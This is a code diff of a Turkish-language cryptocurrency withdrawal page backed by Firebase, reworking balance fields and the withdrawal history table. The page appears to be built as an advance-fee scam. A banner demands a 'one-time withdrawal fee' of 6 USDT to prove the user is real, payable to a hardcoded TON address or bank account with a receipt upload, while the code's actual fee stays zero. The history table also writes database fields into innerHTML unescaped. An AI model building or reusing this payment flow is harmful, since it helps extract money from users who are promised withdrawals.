@@ -151,7 +151,7 @@
 </form>
 
 <div id="paymentNotice" style="display:none;">
-  <p><strong>TEK SEFERLİK Çekim Ücretini Yatırın Lütfen Gerçek kulanıcı oldugunuzu Doğrulayın Gerekli. (6 USDT)</strong></p>
+  <p><strong>TEK SEFERLİK Çekim Ücretini Yatırın Lütfen Gerçek kullanıcı olduğunuzu Doğrulayın Gerekli. (6 USDT)</strong></p>
 
   <label for="paymentOption">Ödeme Seçeneği:</label>
   <select id="paymentOption">
@@ -202,8 +202,8 @@
   const auth = firebase.auth();
   const db = firebase.firestore();
 
-  const minWithdrawAmount = 35;
-  const withdrawFee = 0;
+  const minWithdrawAmount = 30;
+  const withdrawFee = 0; // Para çekim ücreti (6 USDT olarak güncelledim)
 
   const myTonAddress = "UQDalUFWerAg7Bo8-NHtX8OgFHRHI8-OvqpqjXjRDZREXzaF";
   const myIbanInfo = {
@@ -239,9 +239,9 @@
     }
     currentUserEmail = user.email;
     try {
-      const userDoc = await db.collection("balances").doc(user.uid).get();
+      const userDoc = await db.collection("users").doc(user.uid).get();
       if (userDoc.exists) {
-        userBalance = parseFloat(userDoc.data().amount || 0);
+        userBalance = parseFloat(userDoc.data().balance || 0);
         balanceDisplay.textContent = `Bakiye: ${userBalance.toFixed(4)} USDT`;
         withdrawBtn.disabled = false;
       } else {
@@ -413,10 +413,10 @@
       }
 
       await db.runTransaction(async (t) => {
-        const userBalanceRef = db.collection("balances").doc(user.uid);
+        const userBalanceRef = db.collection("users").doc(user.uid);
         const userDoc = await t.get(userBalanceRef);
         if (!userDoc.exists) throw new Error("Kullanıcı bakiyesi bulunamadı.");
-        const currentBalance = parseFloat(userDoc.data().amount || 0);
+        const currentBalance = parseFloat(userDoc.data().balance || 0);
         const totalDeduct = currentWithdrawAmount + withdrawFee;
 
         if (currentBalance < totalDeduct) {
@@ -436,7 +436,7 @@
           createdAt: firebase.firestore.FieldValue.serverTimestamp()
         });
 
-        t.update(userBalanceRef, { amount: currentBalance - totalDeduct });
+        t.update(userBalanceRef, { balance: currentBalance - totalDeduct });
       });
 
       // Güncellenmiş bakiye gösterimi
@@ -450,102 +450,58 @@
       methodSelect.value = "";
       dynamicFields.innerHTML = "";
       paymentNotice.style.display = "none";
-      receiptUpload.value = "";
       paidBtn.disabled = true;
+      receiptUpload.value = "";
       withdrawBtn.disabled = false;
-      currentMethod = null;
-      userTonAddress = "";
-      currentWithdrawAmount = 0;
-      currentAddressOrInfo = {};
-      paymentOption.value = "tonAddress";
-      updatePaymentDetails();
 
-      // Yeni talepleri yükle
       loadUserWithdrawals(currentUserEmail);
 
-    } catch (error) {
+    } catch (err) {
       messageDiv.style.color = "red";
-      messageDiv.textContent = "Hata: " + error.message;
-      console.error(error);
+      messageDiv.textContent = "Hata: " + err.message;
+      console.error(err);
     }
   });
 
-  // Kullanıcının çekim taleplerini yükle
-  function loadUserWithdrawals(email){
-    if (!email) return;
-    db.collection("withdrawals")
-      .where("userEmail", "==", email)
-      .orderBy("createdAt", "desc")
-      .get()
-      .then(snapshot => {
-        withdrawalsTableBody.innerHTML = "";
-        snapshot.forEach(doc => {
-          const w = doc.data();
-          const date = w.createdAt ? new Date(w.createdAt.seconds * 1000).toLocaleString() : "-";
-          const reason = w.reason || "-";
-          withdrawalsTableBody.innerHTML += `
-            <tr>
-              <td>${w.amount.toFixed(4)}</td>
-              <td style="text-transform: capitalize;">${w.status}</td>
-              <td>${w.status === "rejected" ? reason : "-"}</td>
-              <td>${date}</td>
-            </tr>
-          `;
-        });
-      })
-      .catch(err => {
-        console.error("Çekim talepleri yüklenirken hata:", err);
+  // Kullanıcının çekim taleplerini listele
+  async function loadUserWithdrawals(email) {
+    withdrawalsTableBody.innerHTML = "<tr><td colspan='4'>Yükleniyor...</td></tr>";
+    try {
+      const querySnapshot = await db.collection("withdrawals")
+        .where("userEmail", "==", email)
+        .orderBy("createdAt", "desc")
+        .limit(10)
+        .get();
+
+      if (querySnapshot.empty) {
+        withdrawalsTableBody.innerHTML = "<tr><td colspan='4'>Henüz çekim talebiniz yok.</td></tr>";
+        return;
+      }
+
+      withdrawalsTableBody.innerHTML = "";
+      querySnapshot.forEach(doc => {
+        const w = doc.data();
+        const createdAt = w.createdAt ? w.createdAt.toDate().toLocaleString() : "-";
+        const status = w.status === "pending" ? "Beklemede" :
+                       w.status === "approved" ? "Onaylandı" :
+                       w.status === "rejected" ? "Reddedildi" : w.status;
+
+        withdrawalsTableBody.innerHTML += `
+          <tr>
+            <td>${w.amount.toFixed(4)}</td>
+            <td>${status}</td>
+            <td>${w.rejectionReason ? w.rejectionReason : "-"}</td>
+            <td>${createdAt}</td>
+          </tr>
+        `;
       });
+    } catch (err) {
+      withdrawalsTableBody.innerHTML = "<tr><td colspan='4'>Veriler alınamadı.</td></tr>";
+      console.error(err);
+    }
   }
 
-  // Sayfa yüklendiğinde ödeme detaylarını göster
-  updatePaymentDetails();
-
 </script>
-
-</body>
-</html>
-
-<!-- sayfa içeriğin buraya -->
-
-<!-- Alt Menü -->
-<div id="bottomMenu"></div>
-
-<!-- Menü HTML'ini yükle -->
-<script>
-  fetch("bottom-menu.html")
-    .then(res => res.text())
-    .then(html => {
-      document.getElementById("bottomMenu").innerHTML = html;
-    });
-</script>
-
-<!-- Menü.js en sonda -->
-<script src="menü.js"></script>
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
-  import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
-
-  const firebaseConfig = {
-    apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
-    authDomain: "crypto-eccb4.firebaseapp.com",
-    projectId: "crypto-eccb4",
-    storageBucket: "crypto-eccb4.firebasestorage.app",
-    messagingSenderId: "773649197313",
-    appId: "1:773649197313:web:18da6ed3ee63353c4e9300",
-    measurementId: "G-B8D9V0V9XE"
-  };
-
-  const app = initializeApp(firebaseConfig);
-  const auth = getAuth(app);
-
-  onAuthStateChanged(auth, (user) => {
-    if (!user) {
-      window.location.href = "index.html";
-    }
-  });
-</script>
-
 
 </body>
 </html>
